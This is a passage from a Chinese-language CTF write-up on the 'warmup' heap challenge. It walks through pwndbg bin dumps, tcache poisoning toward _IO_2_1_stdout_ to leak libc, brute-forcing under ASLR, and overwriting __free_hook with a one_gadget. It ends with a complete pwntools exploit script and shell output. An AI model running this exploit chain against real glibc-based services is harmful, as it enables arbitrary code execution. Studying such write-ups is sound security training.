+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [ -<span class="number">1</span>]: <span class="number">0</span></span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x5555557576c0</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x5555557577f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x555555757260</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line"><span class="symbol">all:</span> <span class="number">0x5555557576b0</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5555557576b0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>调试的时候可以通过<code>double free</code>修改<code>tcache</code>到<code>_IO_2_1_stdout_</code>,再进行两次<code>add</code>之后会跳到<code>_IO_2_1_stdout_</code></li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">2</span>]: <span class="number">0x555555757760</span> —▸ <span class="number">0x5555557576c0</span> —▸ <span class="number">0x7ffff7dd0760</span> (_IO_2_1_stdout<span class="number">_</span>) ◂— ...</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x5555557576c0</span> —▸ <span class="number">0x7ffff7dd0760</span> (_IO_2_1_stdout<span class="number">_</span>) ◂— <span class="number">0xfbad2887</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x555555757260</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line"><span class="symbol">FD:</span> <span class="number">0x5555557576b0</span> —▸ <span class="number">0x7ffff7dd0760</span> (_IO_2_1_stdout<span class="number">_</span>) —▸ <span class="number">0x7ffff7dd07e3</span> (_IO_2_1_stdout<span class="number">_</span>+<span class="number">131</span>) ◂— <span class="number">0xffffffffff</span></span><br><span class="line"><span class="symbol">BK:</span> <span class="number">0x5555557576b0</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5555557576b0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后根据上面分析的结果,我们设置<code>_IO_2_1_stdout_</code>的结构如下</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p /x _IO_2_1_stdout<span class="number">_</span></span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0xfbad1800</span>,    <span class="regexp">//</span>成功修改了_flags的值</span><br><span class="line">    _IO_read_ptr = <span class="number">0x7ffff7dd07e3</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x7ffff7dd07e3</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7ffff7dd07e3</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x7ffff7dd07e3</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x7ffff7dd07e4</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x7ffff7dd07e4</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7ffff7dd07e3</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x7ffff7dd07e4</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x7ffff7dcfa00</span>, </span><br><span class="line">    _fileno = <span class="number">0x1</span>, </span><br><span class="line">    _flags2 = <span class="number">0x0</span>, </span><br><span class="line">    _old_offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _cur_column = <span class="number">0x0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>, </span><br><span class="line">    _shortbuf = &#123;<span class="number">0xa</span>&#125;, </span><br><span class="line">    _lock = <span class="number">0x7ffff7dd18c0</span>, </span><br><span class="line">    _offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7ffff7dcf8c0</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0x0</span>, </span><br><span class="line">    _mode = <span class="number">0xffffffff</span>, </span><br><span class="line">    _unused2 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">20</span> times&gt;&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7ffff7dcc2a0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过调试可知,泄露的地址与<code>libc</code>基地址的偏移为<code>0x7ffff7dd18b0-0x7ffff79e4000</code>,然后就是常规操作,修改<code>__free_hook</code>为<code>one_gadget</code>的地址,来getshell</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">2</span>]: <span class="number">0x555555757710</span> —▸ <span class="number">0x7ffff7dd18e8</span> (__free_hook) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x5555557576c0</span> ◂— <span class="number">0x7fff44444444</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x555555757260</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line"><span class="symbol">FD:</span> <span class="number">0x5555557576b0</span> ◂— <span class="number">0x7fff44444444</span></span><br><span class="line"><span class="symbol">BK:</span> <span class="number">0x5555557576b0</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5555557576b0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>getshell  </li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.gdb<span class="string">"</span></span><br><span class="line"><span class="string">[+] Waiting for debugger: Done</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">jcxp</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="比赛环境"><a href="#比赛环境" class="headerlink" title="比赛环境"></a>比赛环境</h4><p>比赛环境下,需要爆破<code>_IO_2_1_stdout_</code>的地址,这里我们把<code>aslr</code>开启,我们需要把<code>0x7fbda018cca0</code>覆盖为<code>0x7fbda018d760</code>,等于说我们需要修改最后两个字节,而<code>_IO_2_1_stdout_</code>的后三个数字一直都不变,而且从这两个地址来看,我们只需要爆破第四个数字即可</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x5651034976c0</span> —▸ <span class="number">0x7fbda018cca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x5651034977f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x565103497260</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line"><span class="symbol">all:</span> <span class="number">0x5651034976b0</span> —▸ <span class="number">0x7fbda018cca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5651034976b0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p stdout </span><br><span class="line">$1 = (struct _IO_FILE *) <span class="number">0x7fbda018d760</span> &lt;_IO_2_1_stdout<span class="number">_</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'error'</span></span><br><span class="line">host, port = <span class="string">"192.168.37.140"</span>, <span class="string">"9999"</span></span><br><span class="line">filename = <span class="string">"./warmup"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(p)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    <span class="comment">#script += "b * 0x%x\n"%(LIBC+)</span></span><br><span class="line">    gdb.attach(p,gdbscript=script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">	p.sendafter(<span class="string">"content&gt;&gt;"</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line">	p.sendafter(<span class="string">'content&gt;&gt;'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> p</span><br><span class="line">	p = process(<span class="string">'./warmup'</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p,"b* 0x555555554E29\n")</span></span><br><span class="line">	add(<span class="string">'A'</span>*<span class="number">0x30</span>)</span><br><span class="line">	add(<span class="string">'B'</span>*<span class="number">0x30</span>)</span><br><span class="line">	add(<span class="string">'C'</span>*<span class="number">0x30</span>)</span><br><span class="line">	add(<span class="string">'D'</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">	add(<span class="string">'E'</span>*<span class="number">0x30</span>) </span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	modify(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)) </span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="string">'\xa0'</span>)</span><br><span class="line">	add(<span class="string">'EEEE'</span>)</span><br><span class="line"></span><br><span class="line">	add(chr(<span class="number">0</span>)*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))</span><br><span class="line"></span><br><span class="line">	modify(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">		delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	</span><br><span class="line">	modify(<span class="number">1</span>,p16(<span class="number">0xb760</span>))</span><br><span class="line"><span class="comment">#	modify(1,'\x60\x07\xdd')</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	modify(<span class="number">3</span>, <span class="string">'DDDD'</span>)</span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	modify(<span class="number">3</span>, <span class="string">'\xc0'</span>)</span><br><span class="line">	add(<span class="string">'DDDD'</span>)</span><br><span class="line">	add(<span class="string">'DDDD'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		add(p64(<span class="number">0x0fbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	</span><br><span class="line">	p.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	libc.address=leak-(<span class="number">0x7ffff7dd18b0</span><span class="number">-0x7ffff79e4000</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> libc.address&gt;&gt;<span class="number">40</span> !=<span class="number">0x7f</span> <span class="keyword">or</span> libc.address&amp;<span class="number">0xfff</span> !=<span class="number">0</span>:</span><br><span class="line">		log.failure(<span class="string">"failed"</span>)</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">"libc_base=%s"</span>%hex(libc.address))</span><br><span class="line">	</span><br><span class="line">	free_hook = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">	one_gadget=libc.address+<span class="number">0x4f322</span></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	modify(<span class="number">2</span>,<span class="string">'2222'</span>)</span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	modify(<span class="number">2</span>,p64(free_hook))</span><br><span class="line"><span class="comment">#	debug([0xE29])</span></span><br><span class="line">	add(<span class="string">'jcxp'</span>)</span><br><span class="line">	add(p64(one_gadget))</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'success'</span></span><br><span class="line">	p.close()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exp():</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input('1111')</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> ✘ ⚙ jcxp@ubuntu  ~<span class="regexp">/ctf/practice</span><span class="regexp">/nu1l  python exp.py</span></span><br><span class="line"><span class="regexp">[*] '/home</span><span class="regexp">/jcxp/ctf</span><span class="regexp">/practice/nu</span>1l/warmup<span class="string">'</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    Full RELRO</span></span><br><span class="line"><span class="string">    Stack:    Canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      PIE enabled</span></span><br><span class="line"><span class="string">[*] '</span>/lib/x86_64-linux-gnu/libc.so.<span class="number">6</span><span class="string">'</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    Partial RELRO</span></span><br><span class="line"><span class="string">    Stack:    Canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      PIE enabled</span></span><br><span class="line"><span class="string">[+] Starting local process '</span>./warmup<span class="string">': pid 4511</span></span><br><span class="line"><span class="string">[-] failed</span></span><br><span class="line"><span class="string">[*] Stopped process '</span>./warmup<span class="string">' (pid 4511)</span></span><br><span class="line"><span class="string">[+] Starting local process '</span>./warmup<span class="string">': pid 4514</span></span><br><span class="line"><span class="string">[-] failed</span></span><br><span class="line"><span class="string">[*] Stopped process '</span>./warmup<span class="string">' (pid 4514)</span></span><br><span class="line"><span class="string">[+] Starting local process '</span>./warmup<span class="string">': pid 4516</span></span><br><span class="line"><span class="string">[-] failed</span></span><br><span class="line"><span class="string">[*] Stopped process '</span>./warmup<span class="string">' (pid 4516)</span></span><br><span class="line"><span class="string">[+] Starting local process '</span>./warmup<span class="string">': pid 4518</span></span><br><span class="line"><span class="string">[-] failed</span></span><br><span class="line"><span class="string">[*] Stopped process '</span>./warmup<span class="string">' (pid 4518)</span></span><br><span class="line"><span class="string">[+] Starting local process '</span>./warmup<span class="string">': pid 4520</span></span><br><span class="line"><span class="string">[-] failed</span></span><br><span class="line"><span class="string">[*] Stopped process '</span>./warmup<span class="string">' (pid 4520)</span></span><br><span class="line"><span class="string">[+] Starting local process '</span>./warmup<span class="string">': pid 4522</span></span><br><span class="line"><span class="string">[-] failed</span></span><br><span class="line"><span class="string">[*] Stopped process '</span>./warmup<span class="string">' (pid 4522)</span></span><br><span class="line"><span class="string">[+] Starting local process '</span>./warmup<span class="string">': pid 4533</span></span><br><span class="line"><span class="string">[-] failed</span></span><br><span class="line"><span class="string">[*] Stopped process '</span>./warmup<span class="string">' (pid 4533)</span></span><br><span class="line"><span class="string">[+] Starting local process '</span>./warmup<span class="string">': pid 4535</span></span><br><span class="line"><span class="string">[-] failed</span></span><br><span class="line"><span class="string">[*] Stopped process '</span>./warmup<span class="string">' (pid 4535)</span></span><br><span class="line"><span class="string">[+] Starting local process '</span>./warmup<span class="string">': pid 4537</span></span><br><span class="line"><span class="string">[+] libc_base=0x7fdb4e64f000</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">jcxp</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>
+
